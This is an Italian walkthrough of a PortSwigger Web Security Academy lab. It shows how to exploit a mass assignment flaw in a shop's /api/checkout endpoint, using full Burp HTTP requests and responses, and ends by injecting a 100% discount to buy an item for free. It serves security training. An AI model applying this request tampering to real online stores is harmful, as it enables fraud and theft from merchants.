https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability

Colleghiamoci con le credenziali di `wiener` e inseriamo l'item "Lightweight l33t Leather Jacket" nel nostro carrello

![](_attachment/Pasted%20image%2020250406180503.png)

il nostro credito è attualmente 0, per cui non possiamo acquistarlo.

Rivedendo le richieste tramite Burp, notiamo questa (`/cart`):

![](_attachment/Pasted%20image%2020250406180552.png)

...che rivela, nel body, l'url dell'API:

```html
                   <script type='text/javascript'>
                        const getApiEndpoint = () => '/api/checkout';
                        const buildProductRow = (id, name, price, quantity) => `        <tr>
            <td>
                <a href=/product?productId=${encodeURIComponent(id)}>${name}</a>
            </td>
            <td>${price}</td>
```



```http
GET /api/checkout HTTP/2
Host: 0a2b00d00471e52883d81aee00ad0042.web-security-academy.net
Cookie: session=9mbE3QzgIQ5BXAgV2tiH7MLYWT23fKlr
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2b00d00471e52883d81aee00ad0042.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

risposta:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

Il mio primo tentativo è stato quello di aggiungere un altro prodotto (con lo stesso nome...), senza specificare un ID, con prezzo a 0.

Chiaramente ho convertito il metodo da GET a POST e ho specificato il `Content-Type: application/json`

```http
POST /api/checkout HTTP/2
Host: 0a2b00d00471e52883d81aee00ad0042.web-security-academy.net
Cookie: session=9mbE3QzgIQ5BXAgV2tiH7MLYWT23fKlr
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2b00d00471e52883d81aee00ad0042.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Content-Type: application/json
Content-Length: 131

{"chosen_discount":{"percentage":0},"chosen_products":[{"name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}
```


```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 85

{"error":"Key order: Key chosen_products: Key product_id: undefined is not a string"}
```

Ho provato a *aggiornare* l'item stesso, mettendo prezzo a 0, ma non sembra aver funzionato:

```json
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}
```

risposta:

```http
HTTP/2 201 Created
Location: /cart?err=INSUFFICIENT_FUNDS <==
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

Ho provato a creare lo stesso item con un altro product id (999):

```json
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"999","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}
```

```json
{"type":"ClientError","code":400,"error":"Invalid product id: 999"}
```

`OPTIONS`, `PATCH` .. "Method Not Allowed"



Ho poi visitato l'url `/api` trovando la documentazione:

![](_attachment/Pasted%20image%2020250406181222.png)

cliccando su `Order`:

```json
{
  "chosen_discount": ChosenDiscount,  // defaults to: {"description":null,"discount_id":null,"percentage":0}
  "chosen_products": [ChosenProduct]
}
```





Alla fine, ho semplicemente applicato uno sconto del 100% (`"percentage":100`)

```http
POST /api/checkout HTTP/2
Host: 0a2b00d00471e52883d81aee00ad0042.web-security-academy.net
Cookie: session=9mbE3QzgIQ5BXAgV2tiH7MLYWT23fKlr
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2b00d00471e52883d81aee00ad0042.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Content-Type: application/json
Content-Length: 155

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

```http
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

![](_attachment/Pasted%20image%2020250406180825.png)